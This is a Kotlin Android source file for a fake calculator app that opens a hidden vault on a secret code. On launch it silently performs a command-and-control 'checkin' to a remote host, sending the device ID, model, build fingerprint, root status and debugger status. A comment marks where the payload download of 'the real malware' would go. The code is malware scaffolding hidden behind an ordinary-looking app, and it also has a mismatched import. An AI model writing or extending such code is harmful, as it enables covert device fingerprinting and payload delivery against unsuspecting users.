package org.kalkulator

import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import org.kalkulator.api.C2Service
import org.kalkulator.model.CheckinRequest
import org.kalkulator.model.CheckinResponse
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonGsonConverterFactory
import java.io.File

class MainActivity : AppCompatActivity() {

    private lateinit var tvDisplay: TextView
    private var currentInput = ""
    private var secretCode = "123456" // Secret code to open vault

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvDisplay = findViewById(R.id.tvDisplay)

        setupButtons()
        
        // Initial C2 Checkin
        performCheckin()
    }

    private fun setupButtons() {
        val buttons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
            R.id.btnDot
        )

        for (id in buttons) {
            findViewById<Button>(id).setOnClickListener {
                val btn = it as Button
                currentInput += btn.text
                tvDisplay.text = currentInput
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            currentInput = ""
            tvDisplay.text = "0"
        }

        findViewById<Button>(R.id.btnEqual).setOnClickListener {
            if (currentInput == secretCode) {
                // Open hidden vault
                startActivity(Intent(this, VaultActivity::class.java))
                currentInput = ""
                tvDisplay.text = "0"
            } else {
                // Perform normal calculation (simplified for now)
                try {
                    // Just a mock calculation for now
                    tvDisplay.text = "Result" 
                } catch (e: Exception) {
                    tvDisplay.text = "Error"
                }
                currentInput = ""
            }
        }
    }

    private fun performCheckin() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val request = CheckinRequest(
            deviceId = deviceId,
            model = Build.MODEL,
            manufacturer = Build.MANUFACTURER,
            androidVersion = Build.VERSION.RELEASE,
            buildFingerprint = Build.FINGERPRINT,
            isRooted = isDeviceRooted(),
            isDebugger = android.os.Debug.isDebuggerConnected()
        )

        val retrofit = Retrofit.Builder()
            .baseUrl("https://opm-jet.vercel.app/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()

        val service = retrofit.create(C2Service::class.java)
        service.checkin(request).enqueue(object : Callback<CheckinResponse> {
            override fun onResponse(call: Call<CheckinResponse>, response: Response<CheckinResponse>) {
                if (response.isSuccessful && response.body()?.should_download == true) {
                    // Logic to download payload would go here in the real malware
                    // For now, just log or notify
                }
            }

            override fun onFailure(call: Call<CheckinResponse>, t: Throwable) {
                // Silently fail
            }
        })
    }

    private fun isDeviceRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su",
            "/system/bin/failsafe/su", "/data/local/su"
        )
        for (path in paths) {
            if (File(path).exists()) return true
        }
        return false
    }
}
